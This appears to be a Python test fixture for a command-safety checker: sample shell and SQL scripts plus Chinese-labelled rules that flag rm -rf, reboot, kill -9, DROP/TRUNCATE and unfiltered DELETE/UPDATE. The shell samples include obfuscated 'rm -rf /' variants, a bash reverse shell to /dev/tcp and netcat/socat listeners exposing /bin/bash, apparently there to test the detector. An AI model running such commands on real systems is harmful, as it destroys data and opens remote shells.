# coding=utf-8

script_shell = r'''top # haha
cat > mytest.sh << EOF
$a123 ';' $me
var=`date`
# this is comment
rm -rf /tmp/kkk/*;
EOF
ls|grep abc && date||tree;ps -ef|grep grep
ps \
-ef
rm "-r" '-'f /tmp/abc
echo '   -e 456' #-ef
echo 你好
echo $var;rm -rf /;
echo '$var'
echo "$var"
echo \1\2 #-ef
kill -9 123
kill -n 9 123
kill -s TERM 123
reboot
sysctl -p'''

script_shell_multiline = r'''ls -al;
rm \
-rf \
/
rm \
 \
 \
-rf \
/
rm \ 
-rf \ 
/
rm "\
-rf \" \
/"
rm \
-r -f \
/;ls -al
rm \
'--f'o"r"ce \
-r \
/tmp/*
kill -9 123456
kill -s TERM 123456
kill -n 9 123456
bash -i > /dev/tcp/***REMOVED***/5566
nc -lvvp 1988 -e /bin/bash
socat -lvvp 1988 -e /bin/bash 
echo Done
'''

script_sql = r'''-- MySQL dump 10.16  Distrib 10.1.44-MariaDB, for debian-linux-gnu (x86_64)

/*!40101 SET NAMES utf8 */;

select * from `box`/* cccccccc */;/* cccccccc */select * from `target`;

update table_name set name='test' WhErE id='1';
update table_name set name='test';

--
-- Table structure for table `box`
--

DROP TABLE IF EXISTS `box`;       
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `box` (          
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(36) NOT NULL,
  `description` varchar(63) DEFAULT '',
  `policy_id` int(11) unsigned NOT NULL,
  `subject_id` int(11) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fkey_box_policy_id` (`policy_id`),
  KEY `fkey_box_subject_id` (`subject_id`),
  CONSTRAINT `fkey_box_policy_id` FOREIGN KEY (`policy_id`) REFERENCES `policy` (`id`) ON DELETE NO ACTION ON UPDATE NO ACTION,
  CONSTRAINT `fkey_box_subject_id` FOREIGN KEY (`subject_id`) REFERENCES `subject` (`id`) ON DELETE NO ACTION ON UPDATE NO ACTION
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

-- Dump completed on 2020-07-14 15:47:51
'''

simple_box = []

nocmdb_boxes = [
    {
        'description': '生产核心系统',
        'id': 1,
        'name': '生产核心',
        'policy': {
            'description':
            '生产核心最高级别检查',
            'enabled':
            1,
            'id':
            1,
            'name':
            '生产核心最高级别检查',
            'rules': [{
                'description':
                '全量文件删除',
                'effect_on':
                'script',
                'enabled':
                1,
                'id':
                1,
                'level':
                1,
                'match_param': {
                    'description': '文件删除',
                    'id': 2,
                    'name': 'rm',
                    'params': {
                        'args': [{
                            'action': 'store_true',
                            'name': 'force',
                            'shortcut': '-f,--force'
                        }, {
                            'action': 'store_true',
                            'name': 'recursive',
                            'shortcut': '-r,-R,--recursive'
                        }, {
                            'action': 'store_true',
                            'name': 'help',
                            'shortcut': '--help'
                        }, {
                            'action': 'store_true',
                            'name': 'version',
                            'shortcut': '--version'
                        }, {
                            'name': 'path',
                            'repeatable': '*'
                        }],
                        'name':
                        'rm'
                    },
                    'type': 'cli'
                },
                'match_param_id':
                2,
                'match_type':
                'cli',
                'match_value':
                '[{"name": "force", "operator": "set"}, '
                '{"name": "recursive", "operator": '
                '"set"}, {"name": "help", "operator": '
                '"notset"}, {"name": "version", '
                '"operator": "notset"}, {"name": '
                '"path", "operator": "ilike", "value": '
                '"*"}]',
                'name':
                '删除*批量文件'
            }, {
                'description': '系统重启',
                'effect_on': 'script',
                'enabled': 1,
                'id': 2,
                'level': 1,
                'match_param': {
                    'description': '重启机器',
                    'id': 4,
                    'name': 'reboot',
                    'params': {
                        'args': [{
                            'action': 'store_true',
                            'name': 'help',
                            'shortcut': '--help'
                        }],
                        'name': 'reboot'
                    },
                    'type': ''
                },
                'match_param_id': 4,
                'match_type': 'cli',
                'match_value': '[{"name": "help", "operator": '
                '"notset"}]',
                'name': '系统重启'
            }, {
                'description': 'kill -9',
                'effect_on': 'script',
                'enabled': 0,
                'id': 3,
                'level': 2,
                'match_param': None,
                'match_param_id': None,
                'match_type': 'text',
                'match_value': 'kill\\s+-9\\s+\\d+',
                'name': '强制kill'
            }, {
                'description': '修改系统参数',
                'effect_on': 'script',
                'enabled': 0,
                'id': 4,
                'level': 3,
                'match_param': None,
                'match_param_id': None,
                'match_type': 'text',
                'match_value': 'sysctl',
                'name': '修改系统参数'
            }, {
                'description': 'drop table',
                'effect_on': 'script',
                'enabled': 1,
                'id': 5,
                'level': 0,
                'match_param': {
                    'description': '针对大小写不敏感的场景',
                    'id': 1,
                    'name': 'iregex',
                    'params': {
                        'flag': 'I'
                    },
                    'type': 'regex'
                },
                'match_param_id': 1,
                'match_type': 'sql',
                'match_value': '^\\s*drop\\s+table\\s+.*$',
                'name': '删除数据表'
            }, {
                'description': '调用销毁主机',
                'effect_on': 'param',
                'enabled': 1,
                'id': 6,
                'level': 1,
                'match_param': None,
                'match_param_id': None,
                'match_type': 'filter',
                'match_value': "{serviceName eq 'qcloud/vm(resource)/action'}{inputParams.name eq 'destroy'}",
                'name': '调用销毁主机'
            }, {
                'description':
                '删除根分区',
                'effect_on':
                'script',
                'enabled':
                1,
                'id':
                7,
                'level':
                0,
                'match_param': {
                    'description': '文件删除',
                    'id': 2,
                    'name': 'rm',
                    'params': {
                        'args': [{
                            'action': 'store_true',
                            'name': 'force',
                            'shortcut': '-f,--force'
                        }, {
                            'action': 'store_true',
                            'name': 'recursive',
                            'shortcut': '-r,-R,--recursive'
                        }, {
                            'action': 'store_true',
                            'name': 'help',
                            'shortcut': '--help'
                        }, {
                            'action': 'store_true',
                            'name': 'version',
                            'shortcut': '--version'
                        }, {
                            'name': 'path',
                            'repeatable': '*'
                        }],
                        'name':
                        'rm'
                    },
                    'type': 'cli'
                },
                'match_param_id':
                2,
                'match_type':
                'cli',
                'match_value':
                '[{"name": "force", "operator": "set"}, '
                '{"name": "recursive", "operator": '
                '"set"}, {"name": "help", "operator": '
                '"notset"}, {"name": "version", '
                '"operator": "notset"}, {"name": '
                '"path", "operator": "eq", "value": '
                '"/"}]',
                'name':
                '删除根分区'
            }, {
                'description': 'turnc table',
                'effect_on': 'script',
                'enabled': 1,
                'id': 8,
                'level': 0,
                'match_param': {
                    'description': '针对大小写不敏感的场景',
                    'id': 1,
                    'name': 'iregex',
                    'params': {
                        'flag': 'I'
                    },
                    'type': 'regex'
                },
                'match_param_id': 1,
                'match_type': 'sql',
                'match_value': '^\\s*truncate\\s+table\\s+.*$',
                'name': '清空数据表truncate'
            }, {
                'description': 'delete table without where',
                'effect_on': 'script',
                'enabled': 1,
                'id': 9,
                'level': 0,
                'match_param': {
                    'description': '针对大小写不敏感的场景',
                    'id': 1,
                    'name': 'iregex',
                    'params': {
                        'flag': 'I'
                    },
                    'type': 'regex'
                },
                'match_param_id': 1,
                'match_type': 'sql',
                'match_value': '^\\s*delete\\s+from\\s+(?:(?!where).)*$',
                'name': '清空数据表delete'
            }, {
                'description': 'SET FOREIGN_KEY_CHECKS',
                'effect_on': 'script',
                'enabled': 1,
                'id': 10,
                'level': 3,
                'match_param': {
                    'description': '针对大小写不敏感的场景',
                    'id': 1,
                    'name': 'iregex',
                    'params': {
                        'flag': 'I'
                    },
                    'type': 'regex'
                },
                'match_param_id': 1,
                'match_type': 'sql',
                'match_value': '^\\s*SET\\s+FOREIGN_KEY_CHECKS=\\d;$',
                'name': '更改外键限制'
            }, {
                'description': 'ALTER TABLE',
                'effect_on': 'script',
                'enabled': 1,
                'id': 11,
                'level': 2,
                'match_param': {
                    'description': '针对大小写不敏感的场景',
                    'id': 1,
                    'name': 'iregex',
                    'params': {
                        'flag': 'I'
                    },
                    'type': 'regex'
                },
                'match_param_id': 1,
                'match_type': 'sql',
                'match_value': '^\\s*ALTER\\s+TABLE\\s+.*$',
                'name': '更改表结构'
            }, {
                'description': 'update table without where',
                'effect_on': 'script',
                'enabled': 1,
                'id': 12,
                'level': 0,
                'match_param': {
                    'description': '针对大小写不敏感的场景',
                    'id': 1,
                    'name': 'iregex',
                    'params': {
                        'flag': 'I'
                    },
                    'type': 'regex'
                },
                'match_param_id': 1,
                'match_type': 'sql',
                'match_value': '^\\s*update\\s+(?:(?!where).)*$',
                'name': '更新全量数据表'
            }, {
                'description': 'kill -9',
                'effect_on': 'script',
                'enabled': 1,
                'id': 13,
                'level': 2,
                'match_param': {
                    'description': '进程关闭',
                    'id': 3,
                    'name': 'kill',
                    'params': {
                        'args': [{
                            'name': 'name',
                            'shortcut': '-s'
                        }, {
                            'name': 'number',
                            'shortcut': '-n'
                        }, {
                            'action': 'store_true',
                            'name': 'help',
                            'shortcut': '--help'
                        }, {
                            'action': 'store_true',
                            'name': 's_kill',
                            'shortcut': '-9,-15'
                        }, {
                            'name': 'pid',
                            'repeatable': '*'
                        }],
                        'name':
                        'kill'
                    },
                    'type': ''
                },
                'match_param_id': 3,
                'match_type': 'cli',
                'match_value': '[{"name": "name", "operator": "in", '
                '"value": ["KILL", "TERM"]}, {"name": '
                '"pid", "operator": "set"}]',
                'name': '强制kill(cli-s)'
            }, {
                'description': 'kill -9',
                'effect_on': 'script',
                'enabled': 1,
                'id': 14,
                'level': 2,
                'match_param': {
                    'description': '进程关闭',
                    'id': 3,
                    'name': 'kill',
                    'params': {
                        'args': [{
                            'name': 'name',
                            'shortcut': '-s'
                        }, {
                            'name': 'number',
                            'shortcut': '-n'
                        }, {
                            'action': 'store_true',
                            'name': 'help',
                            'shortcut': '--help'
                        }, {
                            'action': 'store_true',
                            'name': 's_kill',
                            'shortcut': '-9,-15'
                        }, {
                            'name': 'pid',
                            'repeatable': '*'
                        }],
                        'name':
                        'kill'
                    },
                    'type': ''
                },
                'match_param_id': 3,
                'match_type': 'cli',
                'match_value': '[{"name": "number", "operator": "in", '
                '"value": ["9", "15"]}, {"name": "pid", '
                '"operator": "set"}]',
                'name': '强制kill(cli-n)'
            }, {
                'description': 'kill -9',
                'effect_on': 'script',
                'enabled': 1,
                'id': 15,
                'level': 2,
                'match_param': {
                    'description': '进程关闭',
                    'id': 3,
                    'name': 'kill',
                    'params': {
                        'args': [{
                            'name': 'name',
                            'shortcut': '-s'
                        }, {
                            'name': 'number',
                            'shortcut': '-n'
                        }, {
                            'action': 'store_true',
                            'name': 'help',
                            'shortcut': '--help'
                        }, {
                            'action': 'store_true',
                            'name': 's_kill',
                            'shortcut': '-9,-15'
                        }, {
                            'name': 'pid',
                            'repeatable': '*'
                        }],
                        'name':
                        'kill'
                    },
                    'type': ''
                },
                'match_param_id': 3,
                'match_type': 'cli',
                'match_value': '[{"name": "s_kill", "operator": '
                '"set"}, {"name": "pid", "operator": '
                '"set"}]',
                'name': '强制kill(cli-9/15)'
            }]
        },
        'policy_id': 1,
        'subject': {
            'description': '生产核心系统',
            'enabled': 1,
            'id': 1,
            'name': 'CORE_SYSTEM',
            'targets': [
                {
                    'args_scope': None,
                    'enabled': 1,
                    'entity_scope': None,
                    'id': 1,
                    'name': '核心生产'
                },
            ]
        },
        'subject_id': 1
    },
]
